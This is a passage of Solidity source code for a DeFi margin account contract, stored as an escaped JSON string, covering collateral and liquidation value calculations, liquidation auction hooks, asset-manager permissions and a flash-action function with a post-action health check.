use-cases of the approved Creditor might be to:\n     * - Refinance liabilities (change creditor) without having to sell collateral to close the current position first.\n     * @dev Anyone can set the approved creditor for themselves, this will not impact the current owner of the Account\n     * since the combination of \"current owner -> approved creditor\" is used in authentication checks.\n     * This guarantees that when the ownership of the Account is transferred, the approved Creditor of the old owner has no\n     * impact on the new owner. But the new owner can still remove any existing approved Creditors before the transfer.\n     */\n    function setApprovedCreditor(address creditor_) external {\n        approvedCreditor[msg.sender] = creditor_;\n    }\n\n    /* ///////////////////////////////////////////////////////////////\n                          MARGIN REQUIREMENTS\n    /////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Calculates the total collateral value (MTM discounted with a haircut) of the Account.\n     * @return collateralValue The collateral value, returned in the decimal precision of the Numeraire.\n     * @dev Returns the value denominated in the Numeraire of the Account.\n     * @dev The collateral value of the Account is equal to the spot value of the underlying assets,\n     * discounted by a haircut (the collateral factor). Since the value of\n     * collateralized assets can fluctuate, the haircut guarantees that the Account\n     * remains over-collateralized with a high confidence level.\n     * The size of the haircut depends on the underlying risk of the assets in the Account.\n     * The bigger the volatility or the smaller the onchain liquidity, the bigger the haircut will be.\n     */\n    function getCollateralValue() public view returns (uint256 collateralValue) {\n        (address[] memory assetAddresses, uint256[] memory assetIds, uint256[] memory assetAmounts) =\n            generateAssetData();\n        collateralValue =\n            IRegistry(registry).getCollateralValue(numeraire, creditor, assetAddresses, assetIds, assetAmounts);\n    }\n\n    /**\n     * @notice Calculates the total liquidation value (MTM discounted with a factor to account for slippage) of the Account.\n     * @return liquidationValue The liquidation value, returned in the decimal precision of the Numeraire.\n     * @dev The liquidation value of the Account is equal to the spot value of the underlying assets,\n     * discounted by a haircut (the liquidation factor).\n     * The liquidation value takes into account that not the full value of the assets can go towards\n     * repaying the liabilities: a fraction of the value is lost due to:\n     * slippage while liquidating the assets,\n     * fees for the auction initiator,\n     * fees for the auction terminator and\n     * a penalty to the protocol.\n     */\n    function getLiquidationValue() public view returns (uint256 liquidationValue) {\n        (address[] memory assetAddresses, uint256[] memory assetIds, uint256[] memory assetAmounts) =\n            generateAssetData();\n        liquidationValue =\n            IRegistry(registry).getLiquidationValue(numeraire, creditor, assetAddresses, assetIds, assetAmounts);\n    }\n\n    /**\n     * @notice Returns the used margin of the Account.\n     * @return usedMargin The total amount of margin that is currently in use to back liabilities.\n     * @dev Used Margin is the value of the assets that is currently 'locked' to back:\n     *  - All the liabilities issued against the Account.\n     *  - An additional fixed buffer to cover gas fees in case of a liquidation.\n     * @dev The used margin is denominated in the Numeraire.\n     * @dev Currently only one Creditor at a time can open a margin account.\n     * The open liability is fetched at the contract of the Creditor -> only allow trusted audited Creditors!!!\n     */\n    function getUsedMargin() public view returns (uint256 usedMargin) {\n        // Cache creditor\n        address creditor_ = creditor;\n        if (creditor_ == address(0)) return 0;\n\n        // getOpenPosition() is a view function, cannot modify state.\n        usedMargin = ICreditor(creditor_).getOpenPosition(address(this)) + minimumMargin;\n    }\n\n    /**\n     * @notice Calculates the remaining margin the owner of the Account can use.\n     * @return freeMargin The remaining amount of margin a user can take.\n     * @dev Free Margin is the value of the assets that is still free to back additional liabilities.\n     * @dev The free margin is denominated in the Numeraire.\n     */\n    function getFreeMargin() public view returns (uint256 freeMargin) {\n        uint256 collateralValue = getCollateralValue();\n        uint256 usedMargin = getUsedMargin();\n\n        unchecked {\n            freeMargin = collateralValue > usedMargin ? collateralValue - usedMargin : 0;\n        }\n    }\n\n    /**\n     * @notice Checks if the Account is unhealthy.\n     * @return isUnhealthy Boolean indicating if the Account is unhealthy.\n     */\n    function isAccountUnhealthy() public view returns (bool isUnhealthy) {\n        // If usedMargin is equal to minimumMargin, the open liabilities are 0 and the Account is always healthy.\n        // An Account is unhealthy if the collateral value is smaller than the used margin.\n        uint256 usedMargin = getUsedMargin();\n        isUnhealthy = usedMargin > minimumMargin && getCollateralValue() < usedMargin;\n    }\n\n    /**\n     * @notice Checks if the Account can be liquidated.\n     * @return success Boolean indicating if the Account can be liquidated.\n     */\n    function isAccountLiquidatable() external view returns (bool success) {\n        // If usedMargin is equal to minimumMargin, the open liabilities are 0 and the Account is never liquidatable.\n        // An Account can be liquidated if the liquidation value is smaller than the used margin.\n        uint256 usedMargin = getUsedMargin();\n        success = usedMargin > minimumMargin && getLiquidationValue() < usedMargin;\n    }\n\n    /* ///////////////////////////////////////////////////////////////\n                          LIQUIDATION LOGIC\n    /////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Checks if an Account is liquidatable and continues the liquidation flow.\n     * @param initiator The address of the liquidation initiator.\n     * @return assetAddresses Array of the contract addresses of the assets in Account.\n     * @return assetIds Array of the IDs of the assets in Account.\n     * @return assetAmounts Array with the amounts of the assets in Account.\n     * @return creditor_ The contract address of the Creditor.\n     * @return minimumMargin_ The minimum margin.\n     * @return openPosition The open position (liabilities) issued against the Account.\n     * @return assetAndRiskValues Array of asset values and corresponding collateral and liquidation factors.\n     */\n    function startLiquidation(address initiator)\n        external\n        onlyLiquidator\n        nonReentrant\n        updateActionTimestamp\n        returns (\n            address[] memory assetAddresses,\n            uint256[] memory assetIds,\n            uint256[] memory assetAmounts,\n            address creditor_,\n            uint96 minimumMargin_,\n            uint256 openPosition,\n            AssetValueAndRiskFactors[] memory assetAndRiskValues\n        )\n    {\n        inAuction = true;\n        creditor_ = creditor;\n        minimumMargin_ = minimumMargin;\n\n        (assetAddresses, assetIds, assetAmounts) = generateAssetData();\n        assetAndRiskValues =\n            IRegistry(registry).getValuesInNumeraire(numeraire, creditor_, assetAddresses, assetIds, assetAmounts);\n\n        // Since the function is only callable by the Liquidator, we know that a liquidator and a Creditor are set.\n        openPosition = ICreditor(creditor_).startLiquidation(initiator, minimumMargin_);\n        uint256 usedMargin = openPosition + minimumMargin_;\n\n        if (openPosition == 0 || assetAndRiskValues._calculateLiquidationValue() >= usedMargin) {\n            revert AccountErrors.AccountNotLiquidatable();\n        }\n    }\n\n    /**\n     * @notice Transfers the asset bought by a bidder during a liquidation event.\n     * @param assetAddresses Array of the contract addresses of the assets.\n     * @param assetIds Array of the IDs of the assets.\n     * @param assetAmounts Array with the amounts of the assets.\n     * @param bidder The address of the bidder.\n     */\n    function auctionBid(\n        address[] memory assetAddresses,\n        uint256[] memory assetIds,\n        uint256[] memory assetAmounts,\n        address bidder\n    ) external onlyLiquidator nonReentrant {\n        _withdraw(assetAddresses, assetIds, assetAmounts, bidder);\n    }\n\n    /**\n     * @notice Transfers all assets of the Account in case the auction did not end successful (= Bought In).\n     * @param recipient The recipient address to receive the assets, set by the Creditor.\n     * @dev When an auction is not successful, the Account is considered \"Bought In\":\n     * The whole Account including any remaining assets are transferred to a certain recipient address, set by the Creditor.\n     */\n    function auctionBoughtIn(address recipient) external onlyLiquidator nonReentrant {\n        _transferOwnership(recipient);\n    }\n\n    /**\n     * @notice Sets the \"inAuction\" flag to false when an auction ends.\n     */\n    function endAuction() external onlyLiquidator nonReentrant {\n        inAuction = false;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                       ASSET MANAGER ACTIONS\n    ///////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Add or remove an Asset Manager.\n     * @param assetManager The address of the Asset Manager.\n     * @param value A boolean giving permissions to or taking permissions from an Asset Manager.\n     * @dev Only set trusted addresses as Asset Manager. Asset Managers have full control over assets in the Account,\n     * as long as the Account position remains healthy.\n     * @dev No need to set the Owner as Asset Manager as they will automatically have all permissions of an Asset Manager.\n     * @dev Potential use-cases of the Asset Manager might be to:\n     * - Automate actions by keeper networks.\n     * - Do flash actions (optimistic actions).\n     * - Chain multiple interactions together (eg. deposit and trade in one transaction).\n     * @dev Anyone can set the Asset Manager for themselves, this will not impact the current owner of the Account\n     * since the combination of \"stored owner -> asset manager\" is used in authentication checks.\n     * This guarantees that when the ownership of the Account is transferred, the asset managers of the old owner have no\n     * impact on the new owner. But the new owner can still remove any existing asset managers before the transfer.\n     */\n    function setAssetManager(address assetManager, bool value) external {\n        emit AssetManagerSet(msg.sender, assetManager, isAssetManager[msg.sender][assetManager] = value);\n    }\n\n    /**\n     * @notice Executes a flash action.\n     * @param actionTarget The contract address of the actionTarget to execute external logic.\n     * @param actionData A bytes object containing three structs and two bytes objects.\n     * The first struct contains the info about the assets to withdraw from this Account to the actionTarget.\n     * The second struct contains the info about the owner's assets that need to be transferred from the owner to the actionTarget.\n     * The third struct contains the permit for the Permit2 transfer.\n     * The first bytes object contains the signature for the Permit2 transfer.\n     * The second bytes object contains the encoded input for the actionTarget.\n     * @dev This function optimistically chains multiple actions together (= do a flash action):\n     * - It can optimistically withdraw assets from the Account to the actionTarget.\n     * - It can transfer assets directly from the owner to the actionTarget.\n     * - It can execute external logic on the actionTarget, and interact with any DeFi protocol to swap, stake, claim...\n     * - It can deposit all recipient tokens from the actionTarget back into the Account.\n     * At the very end of the flash action, the following check is performed:\n     * - The Account is in a healthy state (collateral value is greater than open liabilities).\n     * If a check fails, the whole transaction reverts.\n     */\n    function flashAction(address actionTarget, bytes calldata actionData)\n        external\n        onlyAssetManager\n        nonReentrant\n        notDuringAuction\n        updateActionTimestamp\n    {\n        // Decode flash action data.\n        (\n            ActionData memory withdrawData,\n            ActionData memory transferFromOwnerData,\n            IPermit2.PermitBatchTransferFrom memory permit,\n            bytes memory signature,\n            bytes memory actionTargetData\n        ) = abi.decode(actionData, (ActionData, ActionData, IPermit2.PermitBatchTransferFrom, bytes, bytes));\n\n        // Withdraw assets to the actionTarget.\n        _withdraw(withdrawData.assets, withdrawData.assetIds, withdrawData.assetAmounts, actionTarget);\n\n        // Transfer assets from owner (that are not assets in this account) to the actionTarget.\n        if (transferFromOwnerData.assets.length > 0) {\n            _transferFromOwner(transferFromOwnerData, actionTarget);\n        }\n\n        // If the function input includes a signature and non-empty token permissions,\n        // initiate a transfer from the owner to the actionTarget via Permit2.\n        if (signature.length > 0 && permit.permitted.length > 0) {\n            _transferFromOwnerWithPermit(permit, signature, actionTarget);\n        }\n\n        // Execute external logic on the actionTarget.\n        ActionData memory depositData = IActionBase(actionTarget).executeAction(actionTargetData);\n\n        // Deposit assets from actionTarget into Account.\n        _deposit(depositData.assets, depositData.assetIds, depositData.assetAmounts, actionTarget);\n\n        // Account must be healthy after actions are executed.\n        if (isAccountUnhealthy()) revert AccountErrors.AccountUnhealthy();\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                        CREDITOR ACTIONS\n    ///////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Updates the actionTimestamp.\n     * @dev Used to avoid frontrunning transfers of the account with actions in the Creditor.\n     */\n    function updateActionTimestampByCreditor() external onlyCreditor updateActionTimestamp { }\n\n    /**\n     * @notice Checks that the increase of the open position is allowed.\n     * @param openPosition The new open position.\n     * @return accountVersion The current Account version.\n     * @dev The Account performs the following checks when an open position (liabilities) are increased:\n     *  - The caller is indeed a Creditor for which a margin account is opened.\n     *  - The A"
    }
  ]
}